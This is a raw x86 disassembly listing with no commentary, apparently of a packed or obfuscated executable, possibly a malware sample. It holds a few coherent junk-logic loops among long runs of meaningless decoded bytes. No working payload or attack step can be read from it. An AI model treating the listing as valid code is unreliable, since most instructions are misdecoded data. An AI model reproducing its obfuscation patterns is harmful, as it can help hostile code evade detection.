  40956e:	mov    ds:0x43377b,eax
  409573:	jmp    0x40952d
  409578:	mov    eax,DWORD PTR [ebp-0x14]
  40957b:	sbb    ebx,0x50bb
  409581:	mov    ecx,DWORD PTR [ebp-0x20]
  409584:	xor    eax,esi
  409586:	and    ebx,0x1e7c
  40958c:	add    eax,edi
  40958e:	sub    DWORD PTR ds:0x4337b7,ecx
  409594:	mov    DWORD PTR [ecx],eax
  409596:	or     ebx,ebx
  409598:	mov    eax,ds:0x413cb2
  40959d:	mov    ebx,0x8e12feb8
  4095a2:	mov    DWORD PTR [ebp-0xc],ebx
  4095a5:	xor    DWORD PTR ds:0x433723,0x433713
  4095af:	mov    eax,DWORD PTR [eax]
  4095b1:	and    DWORD PTR ds:0x433733,0x43382f
  4095bb:	mov    cx,WORD PTR [ebp-0x4]
  4095bf:	jmp    0x4098e0
  4095c4:	jge    0x40957b
  4095c6:	mov    edx,0x397172fe
  4095cb:	mov    ch,0x54
  4095cd:	ds sbb eax,0x2aaa9a0b
  4095d3:	shr    BYTE PTR [ecx+ebx*8+0x7e],0x7e
  4095d8:	jp     0x409657
  4095da:	jle    0x40965a
  4095dc:	jmp    0xcc8c53bc
  4095e1:	xor    dh,BYTE PTR [ebx-0x1a816a01]
  4095e7:	adc    cl,BYTE PTR [esi-0x5a92639d]
  4095ed:	mov    cl,0x1b
  4095ef:	dec    ecx
  4095f0:	inc    eax
  4095f1:	retf   
  4095f2:	je     0x4095b3
  4095f4:	dec    ebp
  4095f5:	retf   0xb2e1
  4095f8:	cwde   
  4095f9:	xor    eax,0x5e1ece47
  4095fe:	in     al,0xaf
  409600:	dec    edx
  409601:	mov    WORD PTR [ecx],gs
  409603:	cs inc edx
  409605:	jle    0x4095e9
  409607:	dec    esi
  409608:	aaa    
  409609:	xchg   edx,eax
  40960a:	mov    eax,ds:0x9bd5b46e
  40960f:	mov    WORD PTR [ebp+0x2f91a2f7],fs
  409615:	test   DWORD PTR [ecx],0x272e2f94
  40961b:	sbb    al,0xfa
  40961d:	push   0x86040e43
  409622:	xlat   BYTE PTR ds:[ebx]
  409623:	pusha  
  409624:	test   eax,ebp
  409626:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409627:	not    DWORD PTR [esi-0x6c70ac0c]
  40962d:	into   
  40962e:	in     al,dx
  40962f:	fiadd  WORD PTR [edi]
  409631:	xchg   esi,eax
  409632:	or     BYTE PTR [ebx+0x68465745],0x1b
  409639:	clc    
  40963a:	inc    esi
  40963b:	inc    edi
  40963c:	mov    dh,0xa9
  40963e:	pop    edx
  40963f:	lock sbb DWORD PTR [esi-0x57],esp
  409643:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409644:	ret    
  409645:	pusha  
  409646:	pop    ds
  409647:	mov    BYTE PTR [ebp-0x264f5b55],ch
  40964d:	jge    0x409671
  40964f:	inc    edi
  409650:	push   edx
  409651:	cmp    esi,DWORD PTR [esi+0x3982cdb1]
  409657:	(bad)  
  409658:	fdivr  QWORD PTR [esi]
  40965a:	repnz loopne 0x4096cc
  40965d:	pop    ecx
  40965e:	or     eax,0xce6c23fd
  409663:	(bad)  
  409664:	fidivr DWORD PTR [ecx+esi*8+0x63]
  409668:	jmp    0x14a0:0x2261abad
  40966f:	jae    0x4096a3
  409671:	mov    ebx,0x9f84e797
  409676:	outs   dx,BYTE PTR ds:[esi]
  409677:	pop    ds
  409678:	fidivr WORD PTR [esi+ebp*8+0x8f6251d]
  40967f:	xor    eax,0x1fe10ef5
  409684:	cld    
  409685:	test   BYTE PTR ds:0xbef17b51,al
  40968b:	ds pop es
  40968d:	imul   edx,DWORD PTR [ecx],0xea20e18
  409693:	iret   
  409694:	mov    gs,WORD PTR ds:0x186eb2b7
  40969a:	call   DWORD PTR [edx-0x51187167]
  4096a0:	inc    esp
  4096a1:	mov    dh,0xb8
  4096a3:	retf   
  4096a4:	pop    esp
  4096a5:	dec    esp
  4096a6:	add    al,0xea
  4096a8:	mov    ecx,eax
  4096aa:	nop
  4096ab:	mov    al,ds:0x168ad11d
  4096b0:	add    al,0xbd
  4096b2:	mov    ebp,0x44b9d629
  4096b7:	dec    ebx
  4096b8:	loop   0x4096d9
  4096ba:	jge    0x40967c
  4096bc:	sub    al,0xdd
  4096be:	fwait
  4096bf:	push   es
  4096c0:	sbb    DWORD PTR [eax],edi
  4096c2:	sub    DWORD PTR [ebp+0x28],ecx
  4096c5:	imul   ebp,esp,0xffffff87
  4096c8:	in     eax,0x6e
  4096ca:	cwde   
  4096cb:	repz cmovno edx,DWORD PTR [ecx]
  4096cf:	(bad)  
  4096d0:	jmp    0xab05:0x97e75288
  4096d7:	jg     0x409715
  4096d9:	or     eax,0x23c8b8b
  4096de:	test   BYTE PTR [ecx-0x456b68b5],dl
  4096e4:	inc    esi
  4096e5:	xor    ch,BYTE PTR [eax+0x27]
  4096e8:	jno    0x409678
  4096ea:	sbb    ebp,ecx
  4096ec:	fwait
  4096ed:	pop    edx
  4096ee:	cmp    al,0x7
  4096f0:	jbe    0x4096db
  4096f2:	push   ebx
  4096f3:	xor    ebx,DWORD PTR [eax-0x2c]
  4096f6:	mov    dl,0xe6
  4096f8:	cmp    al,bl
  4096fa:	pop    edi
  4096fb:	xchg   ebx,eax
  4096fc:	(bad)  
  4096fd:	jge    0x4096d8
  4096ff:	push   0xffffffb1
  409701:	or     DWORD PTR [esi+eax*2+0x41],esi
  409705:	fisubr WORD PTR [ecx-0xd]
  409708:	or     BYTE PTR [ebp-0x37847b],dl
  40970e:	xor    BYTE PTR [ebx+0xe],0xc1
  409712:	cmp    edi,DWORD PTR [eax+0x29]
  409715:	sub    BYTE PTR ds:0x65a90c9f,ah
  40971b:	jg     0x409746
  40971d:	clc    
  40971e:	repnz iret 
  409720:	in     al,0xd6
  409722:	sbb    esp,ebp
  409724:	leave  
  409725:	sbb    dh,dl
  409727:	adc    cl,BYTE PTR [edx+eiz*8]
  40972a:	in     al,dx
  40972b:	mov    bh,0x2d
  40972d:	and    al,0x4e
  40972f:	call   0x37eb8575
  409734:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409735:	cs pop edi
  409737:	or     BYTE PTR [ebx],0x36
  40973a:	ins    BYTE PTR es:[edi],dx
  40973b:	not    bl
  40973d:	mov    ds:0x2d5a7e1,al
  409742:	mov    bh,BYTE PTR [edi-0x31032ee7]
  409748:	or     BYTE PTR [ecx+0x72e9dc41],0x80
  40974f:	in     al,0x6d
  409751:	aad    0x2d
  409753:	mov    ah,0x2e
  409755:	mov    ah,0x85
  409757:	jbe    0x409730
  409759:	fild   DWORD PTR [ebp+0xa744a1e]
  40975f:	push   cs
  409760:	sub    DWORD PTR ds:0xed20f33a,ebp
  409766:	push   0xffffffd4
  409768:	scas   al,BYTE PTR es:[edi]
  409769:	mov    BYTE PTR [esi+0x47],0x1e
  40976d:	in     eax,dx
  40976e:	ins    BYTE PTR es:[edi],dx
  40976f:	pop    ds
  409770:	sbb    DWORD PTR [edi],0xffffffb6
  409773:	xor    eax,0xcb8e8288
  409778:	in     eax,dx
  409779:	or     dl,BYTE PTR [eax-0x488388ee]
  40977f:	icebp  
  409780:	fisub  DWORD PTR [esp+edi*1+0x28]
  409784:	enter  0x3e55,0x75
  409788:	imul   esi,DWORD PTR [ebx-0x2af77fc8],0x5f95f147
  409792:	jecxz  0x4097eb
  409794:	loop   0x4097ca
  409796:	(bad)  
  409797:	sahf   
  409798:	int3   
  409799:	jno    0x409792
  40979b:	add    eax,0x29cd0df5
  4097a0:	mov    esi,0x98f41f86
  4097a5:	test   eax,0x518b9f29
  4097aa:	sahf   
  4097ab:	in     al,0x78
  4097ad:	and    DWORD PTR [ebp+0x3d],eax
  4097b0:	mov    WORD PTR ds:0x4effabed,?
  4097b6:	cmp    eax,0xf614a2f4
  4097bb:	mov    dh,0xad
  4097bd:	dec    esi
  4097be:	xchg   ebx,eax
  4097bf:	test   BYTE PTR ds:0x4273f553,cl
  4097c5:	rcl    BYTE PTR [ecx-0x43],cl
  4097c8:	lods   eax,DWORD PTR ds:[si]
  4097ca:	in     eax,0x2c
  4097cc:	dec    ebp
  4097cd:	jg     0x40983f
  4097cf:	mov    edi,DWORD PTR [ecx+0x4]
  4097d2:	sahf   
  4097d3:	adc    edi,DWORD PTR [ebp+0x5f]
  4097d6:	pop    ss
  4097d7:	push   ecx
  4097d8:	push   ebx
  4097d9:	jo     0x4097da
  4097db:	popf   
  4097dc:	xlat   BYTE PTR ds:[ebx]
  4097dd:	outs   dx,BYTE PTR ds:[esi]
  4097de:	jle    0x409821
  4097e0:	mov    edi,0xd7fcb67
  4097e5:	sti    
  4097e6:	sti    
  4097e7:	push   edi
  4097e9:	(bad)  
  4097eb:	mov    ebx,0xed609552
  4097f0:	jb     0x4097c2
  4097f2:	sbb    DWORD PTR [eax+0x41da1a77],0x759446e1
  4097fc:	pop    ds
  4097fd:	push   ss
  4097fe:	or     al,0x6e
  409800:	and    al,0x6c
  409802:	out    0x96,al
  409804:	(bad)  
  409805:	out    0xa8,al
  409807:	mov    dh,0x95
  409809:	mov    bh,0x8d
  40980b:	mov    ah,BYTE PTR [ebx-0x22]
  40980e:	xchg   esi,eax
  40980f:	xchg   BYTE PTR [ebp-0x2d],al
  409812:	add    esp,eax
  409814:	(bad)  
  409815:	cli    
  409816:	pop    esi
  409817:	or     ebx,DWORD PTR [eax+0x1c83d36a]
  40981d:	mul    ebp
  40981f:	jl     0x40985a
  409821:	sbb    DWORD PTR [ecx-0x3b77d444],ebx
  409827:	xchg   edi,eax
  409828:	sar    DWORD PTR [edi],1
  40982a:	leave  
  40982b:	add    eax,0x1fa1bf7b
  409830:	lds    edx,FWORD PTR [ecx-0x1149e2bf]
  409836:	xor    esp,ebx
  409838:	cdq    
  409839:	jns    0x409812
  40983b:	or     esi,edi
  40983d:	lock or BYTE PTR [ecx-0x6db499ee],bl
  409844:	jle    0x40988a
  409846:	mov    esp,0x6d585493
  40984b:	scas   eax,DWORD PTR es:[edi]
  40984c:	mov    BYTE PTR [edi-0x6fffc1b6],dl
  409852:	push   eax
  409853:	jno    0x40988a
  409855:	inc    ecx
  409856:	test   eax,0x9daec8b6
  40985b:	add    eax,0xe0dc2432
  409860:	sbb    DWORD PTR [eax-0x597c4249],edi
  409866:	retf   
  409867:	(bad)  
  409868:	retf   0x48e4
  40986b:	mov    esi,0xa3485816
  409870:	dec    esp
  409871:	mov    WORD PTR [ebx],ds
  409873:	sub    cl,0x15
  409876:	and    BYTE PTR [ecx],ah
  409878:	mov    dh,0x34
  40987b:	in     eax,0xf5
  40987d:	ja     0x409833
  40987f:	outs   dx,BYTE PTR ds:[esi]
  409880:	das    
  409881:	or     al,0x65
  409883:	sbb    dh,ch
  409885:	pushf  
  409886:	popa   
  409887:	mov    WORD PTR [ecx],cs
  409889:	xchg   DWORD PTR [edx],ebp
  40988b:	sbb    edi,ebp
  40988d:	push   ebx
  40988e:	mov    ebp,0x7d8a3457
  409893:	lds    edx,FWORD PTR [esi]
  409895:	sub    BYTE PTR gs:[edi-0x17],ch
  409899:	pusha  
  40989a:	or     DWORD PTR [eax-0x26],ebx
  40989d:	and    al,BYTE PTR [ecx-0x1fc6cec3]
  4098a3:	ds add eax,0xffac4792
  4098a9:	retf   0x7380
  4098ac:	dec    edx
  4098ad:	sub    dl,BYTE PTR [eax-0x1cb1bfb1]
  4098b3:	out    0x95,al
  4098b5:	adc    ah,bh
  4098b7:	(bad)  
  4098b8:	fs in  eax,dx
  4098ba:	bound  ecx,QWORD PTR [ebp+0x64]
  4098bd:	pop    ds
  4098be:	sbb    eax,0x3b3e3640
  4098c3:	cmp    DWORD PTR [ebx-0x53],0xffffffd1
  4098c7:	and    edi,DWORD PTR [ecx+ecx*8-0x44]
  4098cb:	or     eax,0x59003f3f
  4098d0:	push   edi
  4098d1:	or     BYTE PTR cs:[edx+esi*1-0x3d],dh
  4098d6:	jecxz  0x40986a
  4098d8:	push   esp
  4098d9:	push   ebp
  4098da:	imul   ecx,esp,0xffffff8d
  4098dd:	lahf   
  4098de:	fsub   QWORD PTR [edi-0x7e3648f1]
  4098e4:	sbb    eax,0x43383b
  4098e9:	and    ebx,DWORD PTR [edx+0x0]
  4098ec:	add    BYTE PTR [ebx],al
  4098ee:	or     BYTE PTR [ecx],dl
  4098f0:	sbb    eax,0x4337a7
  4098f5:	mov    DWORD PTR [ebp-0x18],ecx
  4098f8:	and    eax,DWORD PTR ds:0x433737
  4098fe:	mov    eax,DWORD PTR [ebp+0x8]
  409901:	and    DWORD PTR ds:0x43376f,0x0
  40990b:	mov    ecx,DWORD PTR ds:0x43376f
  409911:	inc    ecx
  409912:	mov    DWORD PTR ds:0x43376f,ecx
  409918:	cmp    DWORD PTR ds:0x43376f,0x2e
  40991f:	jne    0x409933
  409925:	push   DWORD PTR [ebp-0x24]
  409928:	push   0x2be2
  40992d:	call   DWORD PTR ds:0x41201c
  409933:	cmp    DWORD PTR ds:0x43376f,0x1f
  40993a:	jb     0x40990b
  409940:	mov    DWORD PTR ds:0x4337a7,0x11
  40994a:	cmp    DWORD PTR ds:0x4337a7,0x0
  409951:	je     0x4099a3
  409957:	cmp    DWORD PTR ds:0x4337a7,0x6
  40995e:	jne    0x409977
  409964:	push   0x4338a4
  409969:	push   DWORD PTR [ebp-0x24]
  40996c:	push   0x64fc
  409971:	call   DWORD PTR ds:0x4121d0
  409977:	cmp    DWORD PTR ds:0x4337a7,0x7
  40997e:	jne    0x409991
  409984:	mov    ecx,DWORD PTR ds:0x4337a7
  40998a:	dec    ecx
  40998b:	mov    DWORD PTR ds:0x4337a7,ecx
  409991:	mov    ecx,DWORD PTR ds:0x4337a7
  409997:	dec    ecx
  409998:	mov    DWORD PTR ds:0x4337a7,ecx
  40999e:	jmp    0x40994a
  4099a3:	mov    ecx,DWORD PTR [ebp-0x8]
  4099a6:	xor    eax,esi
  4099a8:	add    eax,edi
  4099aa:	cmp    DWORD PTR [ecx],eax
  4099ac:	jmp    0x409ccd
  4099b1:	cmovbe ebx,DWORD PTR [esi+0x55e577e5]
  4099b8:	je     0x4099d6
  4099ba:	dec    edi
  4099bb:	cmc    
  4099bc:	fisttp QWORD PTR [eax-0x50]
  4099bf:	or     al,0x9b
  4099c1:	push   0x7a7e7ee4
  4099c6:	jge    0x409a46
  4099c8:	jle    0x4099d8
  4099ca:	jnp    0x409991
  4099cc:	fisub  DWORD PTR [esi+eax*1+0x53]
  4099d0:	dec    ebx
  4099d1:	push   ds
  4099d2:	jbe    0x409a05
  4099d4:	stos   DWORD PTR es:[edi],eax
  4099d5:	mov    dh,0x43
  4099d7:	iret   
  4099d8:	sub    edx,DWORD PTR [ebp-0x1d865315]
  4099de:	ret    0x1005
  4099e1:	sar    ebp,0xdc
  4099e4:	cmp    ecx,edx
  4099e6:	outs   dx,DWORD PTR ds:[esi]
  4099e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099e8:	imul   esi,DWORD PTR [ebx-0x93b739c],0x6d
  4099ef:	hlt    
  4099f0:	inc    edi
  4099f1:	sti    
  4099f2:	js     0x4099fa
  4099f4:	icebp  
  4099f5:	or     BYTE PTR [edx-0x32e1d1e9],bl
  4099fb:	data16 std 
  4099fd:	mov    dh,0xe2
  4099ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a00:	jmp    0x4099ea
  409a02:	out    dx,eax
  409a03:	xlat   BYTE PTR ds:[ebx]
  409a04:	adc    edx,esi
  409a06:	push   0xa20558e
  409a0b:	mov    ds:0xc2287e5d,eax
  409a10:	sub    DWORD PTR [esi-0x4a],ebp
  409a13:	mov    esi,0x4acb047a
  409a18:	jb     0x4099fd
  409a1a:	(bad)
  409a1d:	sub    eax,0xa4fabd68
  409a22:	push   eax
  409a23:	fisubr WORD PTR [edx-0x3cbdf58a]
  409a29:	push   es
  409a2a:	js     0x409a0d
  409a2c:	sbb    BYTE PTR [esi-0x8b456b0],bl
  409a32:	fcomi  st,st(7)
  409a34:	jp     0x409a3f
  409a36:	out    0x97,al
  409a38:	sub    ebx,ebp
  409a3a:	aaa    
  409a3b:	inc    esi
  409a3c:	mov    bl,0x3
  409a3e:	push   ecx
  409a3f:	mov    ebp,0xedd2c97e
  409a44:	sbb    al,0xf0
  409a46:	add    DWORD PTR [ebx],edi
  409a48:	(bad)  
  409a49:	xchg   edi,eax
  409a4a:	std    
  409a4b:	add    bl,BYTE PTR [ebp-0xe]
  409a4e:	cld    
  409a4f:	xchg   edx,eax
  409a50:	pop    edi
  409a51:	jbe    0x409a22
  409a53:	ins    BYTE PTR es:[edi],dx
  409a54:	out    dx,al
  409a55:	ins    BYTE PTR es:[edi],dx
  409a56:	std    
  409a57:	aaa    
  409a58:	imul   esi,DWORD PTR [esi-0x1fc65e82],0xc66b8682
  409a62:	lds    ebx,FWORD PTR [ebx+0x33]
  409a65:	je     0x409a2e
  409a67:	dec    ebx
  409a68:	and    DWORD PTR [eax],edi
  409a6a:	daa    
  409a6b:	popf   
  409a6c:	daa    
  409a6d:	xor    cl,BYTE PTR [ebx]
  409a6f:	dec    edi
  409a70:	mov    bl,0x87
  409a72:	pop    ebx
  409a73:	jne    0x409ae1
  409a75:	or     al,0xb2
  409a77:	sub    dl,BYTE PTR [edi]
  409a79:	xchg   ecx,eax
  409a7a:	push   ebx
  409a7b:	add    al,BYTE PTR [ebp-0x16]
  409a7e:	(bad)  
  409a80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a81:	stos   DWORD PTR es:[edi],eax
  409a82:	clc    
  409a83:	dec    edx
  409a84:	out    dx,eax
  409a85:	push   ecx
  409a86:	test   al,0xbe
  409a88:	(bad)  
  409a89:	pop    esi
  409a8a:	add    esi,eax
  409a8c:	in     al,0x5
  409a8e:	or     ebx,DWORD PTR fs:[ebx+edi*4+0xe]
  409a93:	std    
  409a94:	in     al,dx
  409a95:	in     al,0x6a
  409a97:	adc    eax,0x209c4ce8
  409a9c:	fwait
  409a9d:	aad    0x61
  409a9f:	mov    ebx,0xfeadddfb
  409aa4:	div    BYTE PTR [eax+0x47]
  409aa7:	mov    esp,0x4965d641
  409aac:	mov    ebx,0xf4a78c23
  409ab1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ab2:	shr    BYTE PTR [edx+0x7d],0xcd
  409ab6:	loopne 0x409ae3
  409ab8:	imul   ebx,DWORD PTR [edx+0x3a],0xffffffbf
  409abc:	xchg   esi,edi
  409abe:	xor    BYTE PTR [ebx],dl
  409ac0:	outs   dx,DWORD PTR ds:[esi]
  409ac1:	inc    ebp
  409ac2:	test   al,0x3f
  409ac4:	sbb    BYTE PTR [ebp+0x670e1f1d],0x58
  409acb:	cmp    DWORD PTR [edi-0x23af4111],eax
  409ad1:	xchg   edi,eax
  409ad2:	imul   ebp,DWORD PTR [edi+ebp*2-0x49e3a915],0x4c0996c0
  409add:	jb     0x409a8e
  409adf:	push   DWORD PTR [esi+edi*2-0x5c193dd7]
  409ae6:	cmp    esp,DWORD PTR [ebx]
  409ae8:	retf   0x1105
  409aeb:	loopne 0x409ae4
  409aed:	bound  ecx,QWORD PTR [ebp+0x4e]
  409af0:	test   DWORD PTR [esi+0x34],esp
  409af3:	xor    edi,DWORD PTR [edi-0x59]
  409af6:	pop    esp
  409af7:	push   es
  409af8:	sahf   
  409af9:	sar    DWORD PTR [ebp+0x62],0x71
  409afd:	pushf  
  409afe:	jae    0x409a8a
  409b00:	jb     0x409a96
  409b02:	addr16 rcr esp,1
  409b05:	call   0x18abc806
  409b0a:	cmp    al,0x51
  409b0c:	sub    eax,DWORD PTR [edx]
  409b0e:	cmp    ebp,DWORD PTR [eax-0x75]
  409b11:	rcr    BYTE PTR ds:0xf0bfc431,1
  409b17:	sub    eax,0x67cc73ca
  409b1c:	adc    al,0xd2
  409b1e:	dec    edx
  409b1f:	inc    ecx
  409b20:	rcl    DWORD PTR [eax],0x6d
  409b23:	(bad)  
  409b24:	mov    edx,0xf1e10e76
  409b29:	scas   al,BYTE PTR es:[edi]
  409b2a:	jo     0x409b82
  409b2c:	adc    dh,BYTE PTR [edx+0x3c02590e]
  409b32:	mov    dl,0xe2
  409b34:	pop    edx
  409b35:	or     dh,ch
  409b37:	mov    BYTE PTR [edx-0x72],ah
  409b3a:	add    eax,0xef3ae452
  409b3f:	lahf   
  409b40:	(bad)  
  409b41:	js     0x409ad7
  409b43:	in     al,0x2b
  409b45:	xchg   edx,eax
  409b46:	fucomip st,st(2)
  409b48:	mov    dl,BYTE PTR [eax+0x4b]
  409b4b:	inc    ebp
  409b4c:	in     eax,0xb7
  409b4e:	enter  0x6ed7,0xf
  409b52:	aam    0x3c
  409b54:	cld    
  409b55:	jnp    0x409b79
  409b57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b58:	inc    ecx
  409b59:	cs popa 
  409b5b:	jb     0x409ba2
  409b5d:	shl    al,1
  409b5f:	stc    
  409b60:	fs cmp al,ah
  409b63:	push   ebx
  409b64:	cdq    
  409b65:	adc    al,0x2b
  409b67:	mov    eax,ds:0x1b8a9f50
  409b6c:	jbe    0x409bcd
  409b6e:	mov    eax,0xe309a3a
  409b73:	adc    ecx,DWORD PTR [edi]
  409b75:	aam    0xc1
  409b77:	xchg   ebp,eax
  409b78:	ins    BYTE PTR es:[edi],dx
  409b79:	fcomp  DWORD PTR [ecx]
  409b7b:	push   si
  409b7d:	mul    dl
  409b7f:	ror    BYTE PTR [ecx-0xc],cl
  409b82:	in     al,dx
  409b83:	scas   al,BYTE PTR es:[edi]
  409b84:	sbb    al,0x39
  409b86:	pushf  
  409b87:	pop    edi
  409b88:	rcl    al,0x80
  409b8b:	test   eax,0x69c0fcc0
  409b90:	adc    eax,0xee90ca60
  409b95:	and    esp,DWORD PTR [eax+0x42541f54]
  409b9b:	cmp    DWORD PTR [esi],esi
  409b9d:	shl    BYTE PTR [eax],cl
  409b9f:	cmp    al,BYTE PTR [ebx+eiz*2-0x339f94ee]
  409ba6:	pop    ecx
  409ba7:	mov    esi,0x37570961
  409bac:	shl    BYTE PTR [esi+0x6463a9f0],0x52
  409bb3:	data16 aam 0x3
  409bb6:	xor    edi,edx
  409bb8:	push   edi
  409bb9:	dec    ebx
  409bba:	fadd   QWORD PTR [esi+0x71]
  409bbd:	jmp    ecx
  409bbf:	mov    ecx,0x6b2216e4
  409bc4:	fnstsw WORD PTR [eax-0x192d53cc]
  409bca:	test   DWORD PTR [ecx-0x14196ec5],esp
  409bd0:	imul   edx,DWORD PTR [ebp+0x1989b385],0xfffffffc
  409bd7:	xor    dh,ah
  409bd9:	mov    DWORD PTR [eax-0x41],esp
  409bdc:	mov    dh,BYTE PTR [edx+0x2d]
  409bdf:	pop    eax
  409be0:	in     al,0x14
  409be2:	push   esi
  409be3:	daa    
  409be4:	pop    ebp
  409be5:	mov    edx,0xd9c76b15
  409bea:	(bad)  
  409beb:	outs   dx,BYTE PTR ds:[esi]
  409bec:	ficomp WORD PTR [ebp+0x61]
  409bef:	ficomp WORD PTR [ebp+0xa60d5c8]
  409bf5:	add    DWORD PTR [ebp+0x6b],ecx
  409bf8:	xchg   edx,eax
  409bf9:	dec    ebp
  409bfa:	fs ret 0x70e8
  409bfe:	or     ch,bh
  409c00:	pop    esp
  409c01:	in     al,0xaa
  409c03:	push   esp
  409c04:	loop   0x409c04
  409c06:	jle    0x409bd5
  409c08:	mov    DWORD PTR [ecx+ecx*8],edx
  409c0b:	(bad)  [esi-0x47]
  409c0e:	lods   al,BYTE PTR ds:[esi]
  409c0f:	jl     0x409b9f
  409c11:	jae    0x409ba4
  409c13:	mov    eax,ds:0xcde6729
  409c18:	int    0x3e
  409c1a:	(bad)  
  409c1b:	idiv   DWORD PTR [ecx+0x1d]
  409c1e:	jp     0x409beb
  409c20:	ins    DWORD PTR es:[edi],dx
  409c21:	hlt    
  409c22:	and    eax,0x5a3a2fb
  409c27:	jle    0x409c33
  409c29:	sar    bl,0x22
  409c2c:	xor    edx,edx
  409c2e:	ror    cl,0x11
  409c31:	dec    ebx
  409c32:	adc    ebp,DWORD PTR [edi-0x2578d868]
  409c38:	cmp    edx,edx
  409c3a:	iret   
  409c3b:	ja     0x409ca4
  409c3d:	jns    0x409c2c
  409c3f:	add    ch,dh
  409c41:	(bad)
  409c44:	mov    ebx,0xeb8fc53d
  409c49:	push   esi
  409c4a:	mov    al,gs:0x6f903ec8
  409c50:	push   eax
  409c51:	push   0xffffffc6
  409c53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c54:	mov    ch,0xbb
  409c56:	mov    ebx,0x14c2876a
  409c5b:	xor    al,0xe
  409c5d:	or     al,0x1a
  409c5f:	mov    ebp,0xeae41674
  409c64:	loop   0x409c1d
  409c66:	imul   esp,DWORD PTR [ebx-0x61],0xfffffff3
  409c6a:	sub    al,0x99
  409c6c:	add    BYTE PTR [eax+0x52],cl
  409c6f:	or     DWORD PTR [esp+edx*2-0x79],ebx
  409c73:	aam    0xbf
  409c75:	ret    0xcbf9
  409c78:	stos   DWORD PTR es:[edi],eax
  409c79:	cmp    BYTE PTR [ebx],cl
  409c7b:	inc    esi
  409c7c:	ret    
  409c7d:	xlat   BYTE PTR ds:[ebx]
  409c7e:	mov    dl,0xe
  409c80:	push   DWORD PTR [esi+ebx*1]
  409c83:	xchg   ebp,eax
  409c84:	xor    edi,0x71a7f969
  409c8a:	mov    eax,0xb0e86e6e
  409c8f:	mov    esi,0xad646ac9
  409c94:	sub    ebx,eax
  409c96:	stc    
  409c97:	pop    esi
  409c98:	and    al,0x74
  409c9a:	xchg   esp,eax
  409c9b:	into   
  409c9c:	imul   esi,esi,0xc9d56828
  409ca2:	xchg   edi,eax
  409ca3:	in     eax,dx
  409ca4:	push   cs
  409ca5:	adc    dh,BYTE PTR [esi+0x71]
  409ca8:	push   cs
  409ca9:	jne    0x409c39
  409cab:	jae    0x409d13
  409cad:	jmp    0x3e6e:0xce459aec
  409cb4:	mov    ds:0x9d96ae98,al
  409cb9:	jnp    0x409c52
  409cbb:	and    ah,dh
  409cbd:	dec    ebp
  409cbe:	stc    
  409cbf:	or     eax,0x32fa8ba1
  409cc4:	inc    esp
  409cc5:	mov    ebx,0x2a4c26ab
  409cca:	imul   ebx,DWORD PTR [esi+ecx*8],0x6c6850f
  409cd1:	add    BYTE PTR [eax],al
  409cd3:	mov    eax,DWORD PTR [ebp+0x8]
  409cd6:	mov    ecx,DWORD PTR [ebp-0x18]
  409cd9:	xor    eax,esi
  409cdb:	add    eax,edi
  409cdd:	cmp    DWORD PTR [ecx],eax
  409cdf:	jne    0x40a344
  409ce5:	mov    eax,DWORD PTR [ebp+0x8]
  409ce8:	jmp    0x40a009
  409ced:	inc    edi
  409cee:	aad    0xe6
  409cf0:	shl    BYTE PTR [ecx+esi*8+0x71],1
  409cf4:	push   ecx
  409cf5:	out    0xaa,eax
  409cf7:	push   esp
  409cf8:	stc    
  409cf9:	test   al,0xaa
  409cfb:	stos   BYTE PTR es:[edi],al
  409cfc:	xor    BYTE PTR [ebx+eiz*8+0x7e],dh
  409d00:	jle    0x409d7c
  409d02:	jge    0x409d82
  409d04:	jle    0x409cd2
  409d06:	pop    ebp
  409d07:	xchg   ebx,eax
  409d08:	test   edi,edx
  409d0a:	js     0x409ccd
  409d0c:	into   
  409d0d:	jmp    0x676d:0x9f0ebe61
  409d14:	mov    al,ds:0x6384ee56
  409d19:	ret    
  409d1a:	adc    BYTE PTR [edi],dl
  409d1c:	push   ss
  409d1d:	std    
  409d1e:	retf   0x500c
  409d21:	inc    edx
  409d22:	test   BYTE PTR [edi-0x77],dh
  409d25:	push   ebp
  409d26:	pop    DWORD PTR [edx]
  409d28:	jmp    0x409cdd
  409d2a:	out    0x10,eax
  409d2c:	ja     0x409d02
  409d2e:	jns    0x409d25
  409d30:	fmul   QWORD PTR [ecx+0x4f9a07b2]
  409d36:	outs   dx,DWORD PTR ds:[esi]
  409d37:	(bad)  
  409d38:	pushf  
  409d39:	mov    eax,ds:0x7dcc6522
  409d3e:	and    eax,ebx
  409d40:	mov    BYTE PTR [ecx-0xfa4d274],ah
  409d46:	lods   al,BYTE PTR ds:[esi]
  409d47:	jae    0x409d66
  409d49:	inc    esp
  409d4a:	inc    ebp
  409d4b:	xor    BYTE PTR [edi-0x625b8f96],bh
  409d51:	xor    eax,0xe2828c74
  409d56:	jg     0x409ce4
  409d58:	mov    ecx,0x2a75533d
  409d5d:	neg    cl
  409d5f:	push   esp
  409d60:	daa    
  409d61:	or     ebp,ebp
  409d63:	wbinvd 
  409d65:	add    al,0xcd
  409d67:	neg    DWORD PTR [esp+edi*8]
  409d6a:	stos   BYTE PTR es:[edi],al
  409d6b:	and    BYTE PTR [esi+0x62],bh
  409d6e:	cmc    
  409d6f:	pop    edi
  409d70:	and    dh,BYTE PTR [ecx+0x3be2e2b7]
  409d76:	and    ah,dl
  409d78:	pop    eax
  409d79:	add    eax,0x1e0d68b0
  409d7f:	leave  
  409d80:	xor    eax,0x73fa560e
  409d85:	fsubrp st(1),st
  409d87:	dec    edi
  409d88:	in     al,dx
  409d89:	pop    ss
  409d8a:	and    BYTE PTR [edx],ch
  409d8c:	jns    0x409dd0
  409d8e:	ins    DWORD PTR es:[edi],dx
  409d8f:	clc    
  409d90:	jge    0x409dd6
  409d92:	fidivr DWORD PTR [ecx-0x69acf061]
  409d98:	imul   BYTE PTR [edx]
  409d9a:	imul   edi,DWORD PTR [ebp+0x5d132ded],0x6a
  409da1:	mov    ebx,0x26b4d98a
  409da6:	ret    0x9271
  409da9:	(bad)  
  409daa:	sub    eax,0x55e6c586
  409daf:	inc    edi
  409db0:	cs scas al,BYTE PTR es:[edi]
